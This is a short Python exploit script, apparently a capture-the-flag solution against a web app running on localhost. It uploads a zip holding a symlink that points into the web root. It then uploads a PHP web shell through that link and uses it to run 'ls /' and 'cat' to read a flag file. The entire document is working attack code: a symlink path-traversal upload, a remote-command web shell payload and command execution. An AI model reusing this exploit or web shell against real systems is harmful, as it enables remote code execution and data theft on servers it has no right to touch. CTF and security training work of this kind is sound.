import io, stat, zipfile, requests, re

URL = "http://127.0.0.1:5000"
LINK_NAME = "rce.txt"
TARGET = "/var/www/html/rce.php"

def make_symlink_zip(link_name, target):
    payload = io.BytesIO()
    info = zipfile.ZipInfo(link_name)
    info.create_system = 3  # Unix attributes.
    info.external_attr = (stat.S_IFLNK | 0o777) << 16
    info.compress_type = zipfile.ZIP_STORED
    with zipfile.ZipFile(payload, "w") as zf:
        zf.writestr(info, target)
    payload.seek(0)
    return payload

php_payload = b"<?php system($_GET['cmd']); ?>"

s = requests.Session()

zip_payload = make_symlink_zip(LINK_NAME, TARGET)
s.post(URL, files={"file": ("link.zip", zip_payload, "application/zip")})
s.post(URL, files={"file": (LINK_NAME, php_payload, "text/plain")})
r = s.get(f"{URL}/rce.php", params={"cmd": "ls /"})
flag_path = re.search(r'(.){8}_flag\.txt', r.text).group()
r = s.get(f"{URL}/rce.php", params={"cmd": f"cat /{flag_path}"})
print(f"FLAG: {r.text.strip()}")


